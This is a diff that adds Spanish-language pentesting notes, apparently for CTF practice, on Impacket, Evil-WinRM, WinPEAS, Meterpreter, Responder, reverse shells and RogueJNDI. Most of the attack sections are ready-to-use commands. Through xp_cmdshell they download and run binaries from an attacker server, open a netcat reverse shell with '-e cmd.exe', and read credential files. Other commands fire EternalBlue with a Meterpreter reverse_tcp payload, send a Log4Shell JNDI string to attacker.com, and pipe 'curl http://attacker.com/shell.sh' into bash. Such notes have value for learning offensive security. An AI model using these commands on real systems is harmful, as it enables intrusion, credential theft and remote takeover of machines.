@@ -1,0 +1,264 @@
+······················································································································································································
+·· Impacket ··········································································································································································
+······················································································································································································
+	
+> Conjunto de herramientas y librerías para el análisis, explotación y manipulación de protocolos usados en redes Microsoft.
+> Se usa en ciberseguridad ofensiva, especialmente en pruebas de penetración y ejercicios de Red Team. 
+> Conexión SMB
+> Conexión MSSQL
+    |
+    |> git clone https://github.com/SecureAuthCorp/impacket.git 
+    |
+    |> Implementación de protocolos red |> SMBv1, SMBv2 (compartición de archivos)
+    |                                   |> NTLM, Kerberos (autenticación)
+    |                                   |> RDP, LDAP, DNS, MSSQL, etc.
+    |
+    |> Herramientas de pentesting |> secretsdump.py - Extrae hashes de contraseñas de sistemas Windows.
+    |                             |> psexec.py - Ejecución remota de comandos en sistemas Windows (similar a PsExec).
+    |                             |     |
+    |                             |     |> Conexión modo administrador (sin dominio) > psexec.py <ROOT_USER>@<IP_MÁQUINA>
+    |                             |     |> Conexión modo administrador > psexec.py <DOMAIN_NAME>/<ROOT_USER>@<IP_MÁQUINA>
+    |                             |		
+    |                             |> lookupsid.py - Enumera los SID de usuarios y grupos en máquinas Windows.
+    |                             |     |				
+    |                             |     |> lookupsid.py anonymous@<IP> -no-pass 				
+    |                             |		
+    |                             |> smbclient.py - Cliente SMB interactivo para navegar y manipular comparticiones.
+    |                             |> wmiexec.py - Ejecución de comandos mediante WMI.
+    |                             |> ticketer.py - Genera tickets Kerberos falsos (utilizado en ataques como Golden Ticket).
+    |                             |> ntlmrelayx.py - Herramienta para ataques de relé NTLM.
+    |                             |> mssqlclient.py - Permite la conexión y manipulación de bases de datos MSSQL, como la autenticación con hash, ejecución de comandos y 
+    |                                   |             enumeración de usuarios. 
+    |                                   |
+    |                                   |> Conexión al servidor MSSQL (en la ruta donde está impacket)> python3 mssqlclient.py <COMPUTER_NAME>/sql_svc@<IP_MÁQUINA> -windows-auth
+    |                                                                                                             |
+    |> Ataques comunes facilitados por impacket |> Pass-the-Hash                                                  |> sql_svc > AD que ejecuta el servicio Microsoft SQL Server. 
+    |                                           |> Pass-the-Ticket                                                |> -windows-auth > Método de autenticación de Windows.
+    |                                           |> NTLM Relay								
+    |                                           |> Kerberoasting  
+    |                                           |> Lateral movement y ejecución remota
+    |	
+    |> Puertos
+         |
+         |> SMB 139/TCP		
+         |> SMB 445/TCP 
+
+
+······················································································································································································
+·· Evil-WinRM ········································································································································································	
+······················································································································································································
+
+> Es una interfaz de administración remota basada en HTTP/HTTPS que permite ejecutar comandos en sistemas Windows, similar a PowerShell Remoting.
+> Evil-WinRM aprovecha esta funcionalidad para permitir al atacante interactuar con el sistema como si estuviera dentro.		
+    |					
+    |> Instalación					
+    |    |				
+    |    |> sudo apt install evil-winrm
+    |    |> https://github.com/Hackplayers/evil-winrm
+    |					
+    |> Para que sirve				
+    |    |
+    |    |> Ejecutar comandos en el sistema remoto
+    |    |> Subir y descargar archivos
+    |    |> Cargar scripts de PowerShell
+    |    |> Abrir una pseudo-shell en el sistema Windows
+    |    |> Iniciar movimientos laterales o escalar privilegios
+    |	
+    |> Características
+    |    |
+    |    |> Interfaz amigable tipo shell
+    |    |> Soporte para scripts de PowerShell (.ps1)
+    |    |> Integración con herramientas de post-explotación
+    |    |> Soporte para autenticación con hashes (pass-the-hash) y certificados
+    |    |> Automatización de tareas comunes
+    |	 
+    |> Cuando se usa	
+    |    |
+    |    |> Tras obtener credenciales válidas en un Active Directory
+    |    |> En CTFs (como Hack The Box o TryHackMe)
+    |    |> En pruebas de post-explotación contra máquinas Windows
+    |    |> Como alternativa a Meterpreter o PsExec, pero menos invasiva
+    |	
+    |> Usos
+    |    |
+    |    |> Si se escuchan peticiones > cat /usr/share/responder/Responder.conf
+    |    |> Conectarnos con user y pass > evil-winrm -i <IP> -u <USER> -p <PASS>
+    |	
+    |> Parámetros
+         |
+         |> IP host objetivo > -i 
+         |> Usuario > -u
+         |> Contraseña > -p
+         |> Autenticación por certificado > -c / -k
+         |> Interactuar con scripts personalizados > -s / -e / etc
+    	
+
+······················································································································································································					
+·· WinPEAS ···········································································································································································
+······················································································································································································
+
+> Es una herramienta de reconocimiento post-explotación para Windows. 
+> Automatiza la búsqueda de vectores de escalada de privilegios en sistemas Windows. 
+> Busca configuraciones débiles, vulnerabilidades y otras oportunidades que permitan obtener privilegios más altos (usuario, administrador o SYSTEM) 
+    |
+    |> Instalación sudo apt install peass
+    |
+    |> Funcionalidades principales |> Enumeración del sistema operativo: versión, arquitectura, parches, etc.
+    |                              |> Usuarios y grupos: información sobre cuentas con privilegios elevados.
+    |                              |> Servicios y tareas programadas: busca configuraciones maliciosas o mal configuradas.
+    |                              |> Permisos de archivos y directorios: busca archivos con permisos de escritura que puedan explotarse.
+    |                              |> Variables de entorno y rutas: analiza posibles PATH hijacking.
+    |                              |> Programas instalados y software potencialmente vulnerable.
+    |                              |> Credenciales almacenadas: busca contraseñas o hashes en texto claro en archivos o registros.
+    |                              |> Configuraciones de seguridad: UAC, Windows Defender, políticas de seguridad.
+    |
+    |> Caso de uso típicos |> Pentesters que están auditando la seguridad de sistemas Windows.
+    |                      |> Red Teamers en ejercicios de simulación de ataque.
+    |                      |> Cibercriminales (en contextos reales de ataque).
+    |                      |> Defensores y Blue Teams para entender cómo podrían ser atacados y remediar configuraciones peligrosas.
+    |					   
+    |> Uso |> peass > Muestra los ejecutables disponibles en bash y exe. 				
+    	   |> winpeas --help > Muestra los ejecutables disponibles. 	 			   
+    	   |			   
+    	   |> Para inyectar un fichero realizamos los siguientes pasos: 			   
+                |			   
+                |> Activar el servidor (/usr/share/peass/winpeas) > python3 -m http.server
+                |> Usar PowerShell para inyectar el archivo > EXEC xp_cmdshell 'powershell.exe wget http://<IP_USER>:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe';
+                |> Ejecutar el script > EXEC xp_cmdshell 'c:\\Users\Public\\winPEASx64.exe';
+                |> Buscar algo específico y que lo muestre > EXEC xp_cmdshell 'c:\\Users\\Public\\winPEASx64.exe | findstr /i "<SEARCH>"';  
+                |> EXEC xp_cmdshell 'powershell.exe cat <UBICACION_CREDENCIALES>';
+					
+				
+······················································································································································································
+·· Meterpreter ·······································································································································································	
+······················································································································································································
+
+> Meterpreter es una herramienta avanzada de post-explotación que forma parte del framework Metasploit, una plataforma muy utilizada en pruebas de penetración y hacking 
+  ético. Está diseñada para proporcionar un shell interactivo que permite al atacante (o auditor) controlar un sistema comprometido de manera sigilosa y flexible.
+ 
+> Meterpreter es un payload (carga útil) que se ejecuta en la memoria del sistema objetivo, sin escribir archivos en disco (fileless), lo que le ayuda a evadir muchas 
+  soluciones antivirus.
+     |	
+     |> Principales características
+     |     |
+     |     |> Ejecución en memoria (RAM), evitando la detección.
+     |     |> Módulos extendibles: puedes cargar funciones adicionales como captura de pantalla, keylogging, pivoteo, etc.
+     |     |> Control remoto del sistema: acceso a archivos, procesos, red, webcam, etc.
+     |     |> Comunicación cifrada entre el cliente y el host.
+     |     |> Soporte para múltiples plataformas (Windows, Linux, Android, etc.).
+     |
+     |
+     |> Comandos útiles de Meterpreter
+     |     |
+     |     |> Muestra información del sistema objetivo - sysinfo    
+     |     |> Muestra el usuario actual - getuid                    
+     |     |> Abre una shell del sistema - shell                    
+     |     |> Sube o baja archivos del sistema - upload / download  
+     |     |> Toma una captura de pantalla del objetivo - screenshot     
+     |     |> Inicia y muestra keylogging - keyscan_start / keyscan_dump 
+     |     |> Toma una foto desde la cámara - webcam_snap                
+     |
+     |
+     |> Ejemplo básico de uso
+           |
+           |> Explotas una vulnerabilidad con Metasploit
+           |     |
+           |     |> use exploit/windows/smb/ms17_010_eternalblue
+           |     |> set payload windows/meterpreter/reverse_tcp
+           |     |> set LHOST <tu_ip>
+           |     |> run
+           |
+           |> Si la explotación tiene éxito, se abrirá una sesión Meterpreter
+                 |
+                 |> meterpreter > sysinfo
+                 |> meterpreter > shell
+						
+
+······················································································································································································
+·· Responder ·········································································································································································	
+······················································································································································································
+
+> Es una herramienta de post-explotación muy utilizada en red teaming y pentesting interno para envenenar protocolos de red (como LLMNR, NBT-NS y MDNS) en redes Windows. 
+> Es una de las herramientas más efectivas para capturar hashes NTLM y escalar privilegios dentro de redes mal configuradas.
+     |
+     |> Que hace exactamente
+     |     |
+     |     |> Escucha peticiones en la red y, cuando detecta solicitudes a nombres que no pueden resolverse por DNS, responde 
+     |        como si fuera el servidor legítimo. Esto se llama spoofing de resolución de nombres. Una vez que una víctima
+     |        intenta autenticarse con este “falso servidor”, Responder:
+     |            |
+     |            |> Captura el hash NTLMv1/v2 del usuario
+     |            |> Puede hacer ataques de relay (usando otras herramientas como ntlmrelayx)
+     |            |> Permite realizar ataques de man-in-the-middle (MitM)
+     |     		
+     |> Protocolos que puede "envenenar"			
+     |     |
+     |     |> LLMNR (Link-Local Multicast Name Resolution)
+     |     |> NBT-NS (NetBIOS Name Service)
+     |     |> mDNS (Multicast DNS)
+     |     |> SMB, HTTP, LDAP, FTP, entre otros
+     |	
+     |> Para que se usa
+     |     |
+     |     |> Usuario escribe mal una ruta	> Captura del hash NTLM
+     |     |> Aplicación busca un recurso > Spoofing y captura de credenciales
+     |     |> Ataque en red interna > Escalada de privilegios lateral
+     |	
+     |> Usos
+     |     |
+     |     |> sudo responder -I eth0
+     |     |> sudo responder -I tun0 -v
+     |     |> sudo python3 /usr/share/responder/Responder.py -I tun0
+     |	
+     |> Parámetros
+           |
+           |> -I: interfaz de red a usar (como eth0, tun0, etc.)				
+				
+				
+······················································································································································································		
+·· Reverse Shell ·····································································································································································		
+······················································································································································································
+	
+> Conexión a un equipo remoto para controlarlo y poder atacarlo. 
+     |
+     |> Windows
+          |
+          |> Comprobar si existe el directorio > EXEC xp_cmdshell 'dir C:\Users\Public\';
+          |> Prueba crear un fichero > EXEC xp_cmdshell 'echo hola > C:\Users\Public\prueba.txt';
+          |> Ejecutar el servidor > python3 -m http.server 80
+          |> Inyectar el ejecutable (https://eternallybored.org/misc/netcat/)> EXEC xp_cmdshell "powershell -c Invoke-WebRequest 'http://<IP_USER>/nc.exe' -OutFile 'C:\Users\Public\nc.exe'";
+          |> Abrir puerto (Listener) > nc -lvnp 9999
+          |> Hacer la reverse Shell > EXEC xp_cmdshell " C:\Users\Public\nc.exe <IP_USER> 9999 -e cmd.exe";
+
+
+······················································································································································································
+·· RogueJNDI ·········································································································································································	
+······················································································································································································	
+
+> Es una herramienta ofensiva de explotación JNDI (Java Naming and Directory Interface), usada principalmente para simular servidores maliciosos que permiten explotar 
+  vulnerabilidades de deserialización en aplicaciones Java. Es especialmente conocida por su rol en la explotación de la vulnerabilidad Log4Shell (CVE-2021-44228) en Log4j.
+> JNDI es una API de Java que permite a las aplicaciones localizar y acceder a recursos como objetos remotos, servicios LDAP, bases de datos, etc.
+     |
+     |> Para que sirve
+     |     |
+     |     |> Crea un servidor LDAP malicioso (u otros como RMI, DNS) que puede
+     |          |
+     |          |> Servir payloads remotos de Java
+     |          |> Ejecutar comandos arbitrarios cuando una aplicación Java hace una consulta JNDI insegura
+     |          |> Facilitar la explotación de vulnerabilidades como Log4Shell
+     |          |> Realizar pruebas de seguridad en entornos controlados
+     |     	
+     |> Usos 		
+          |
+          |> Explotar Log4Shell
+          |     | 
+          |     |> ${jndi:ldap://attacker.com:1389/exploit} > Devuelve un payload que ejecuta comandos maliciosos
+          |          |
+          |          |> ${...}: Syntax to be evaluated by Log4j
+          |          |> jndi: Use JNDI, a Java API for naming and directory services
+          |          |> ldap: Protocol use
+          |          |> /test: A placeholder path used to avoid errors in the JNDI lookup.
+          |   
+          |> Pruebas de deserialización insegura en aplicaciones Java
+          |
+          |> java -jar RogueJNDI.jar --command "curl http://attacker.com/shell.sh | bash"
